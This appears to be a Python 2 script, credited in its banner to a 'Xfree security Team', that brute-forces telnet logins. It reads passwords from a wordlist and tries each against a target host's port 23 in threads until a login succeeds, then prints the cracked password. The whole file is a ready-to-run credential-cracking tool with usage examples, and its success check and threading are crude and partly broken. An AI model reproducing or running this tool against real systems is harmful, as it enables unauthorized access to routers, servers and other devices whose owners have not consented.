#!/usr/bin/env python
#coding:utf-8
import telnetlib,sys,getopt,re
import threading  

start = 0
end = 0
lock = threading.Lock()  
thread_num = 1
Host = ''

class MyThread(threading.Thread):
	file = ''
	def __init__(self,files, name):
		threading.Thread.__init__(self)
		self.f = open(files,'r')
		self.file = self.f.read()
		self.t_name = name
		print "\nthread "+str(self.t_name) + '\n '
	
	def run(self):
		global start
		global end
		if lock.acquire(1):
			while self.file.find('\n',end) != -1:
				print "Thread " + self.name
				end = self.file.find('\n', start)
				TelnetBrute.do_telnet(Host,USER, self.file[start:end])
				start = end +1
		lock.release()


	def __del__(self):
		self.f.close()
		
	#def __del__(self):
	#	f.close()



class TelnetBrute:
	thread_num = 1
	def usage(self):
		try:
			if len(sys.argv) <> 1:
				options, args = getopt.getopt(sys.argv[1:], "i:u:f:t:")
				for name , value in options:
					if name in ('-i'):
						global Host
						Host = value
					if name in ('-u'):
						global USER
						USER = value
					if name in ('-f'):
						global file
						file = value
					if name in ('-t'):
						global thread_num
						thread_num = int(value)
						

			else:
				print """
         ###                  
        #                     
        #                     
## ##  #### ## ##   ##    ##  
 # #    #    ##    #  #  #  # 
  #     #    #     ####  #### 
 # #    #    #     #     #    
## ##  #### ###     ###   ### 
	Telnet Crack Tools
		----code by fengxuan
		----We Are From Xfree security Team
	[*]===========================================[*]
	[*] Telnet brute tools                        [*]
	[*]    exploit in windows linux Route         [*]
	[*]  usage:                                   [*]
	[*]     %s                       [*]
	[*]     [-i|--ip]                             [*]
	[*]     [-u|--user]                           [*]
	[*]     [-f|--file]                           [*]
	[*]     [-t|--thread_num]                     [*]
	[*] example:  %s                 [*]
	[*]  -i 127.0.0.1 -u root -f dict.txt -t 4    [*]
	[*]===========================================[*]
					 """ % (sys.argv[0], sys.argv[0])
				return 1
		except:
			raise
			
	@staticmethod
	def do_telnet(host, user, passwd):  
		print host + ' ' + user +' ' +passwd

		try:
			tn = telnetlib.Telnet(host, port=23, timeout=10)
			tn.set_debuglevel(2)  
			
			
			tn.read_until('login: ',5)  
			tn.write(user.encode('GB2312')+'\r\n'.encode('GB2312'))  
			
			tn.read_until('password: ',5)
			print '[*]-try crack with %s ' % passwd
			tn.write(passwd.encode('GB2312')+'\r\n'.encode('GB2312'))

			temp = tn.read_until('~&:',5)  
			print "we get the fuck information from the Server: " + temp 
			if re.search('Server.|password|C:', temp) <> None and re.search(r'#|$', temp) <> None: #登陆成功的识别，各个系统不一样，破解其他系统，请自行添加
				print "[!]what a fuck! you fuck get the pass --the password is : " + passwd + "\n\n"
				sys.exit()
			tn.close() # tn.write('exit\n'
		except KeyboardInterrupt:
			sys.exit('\r\n over \r\n ')

	def run(self):
		self.usage()
		if (thread_num !='' and file !='' and Host !=''):
			for i in range(thread_num):
				t = MyThread(file, i)
				t.start()
		

if __name__=='__main__':
	tn = TelnetBrute()
	sys.exit(tn.run())
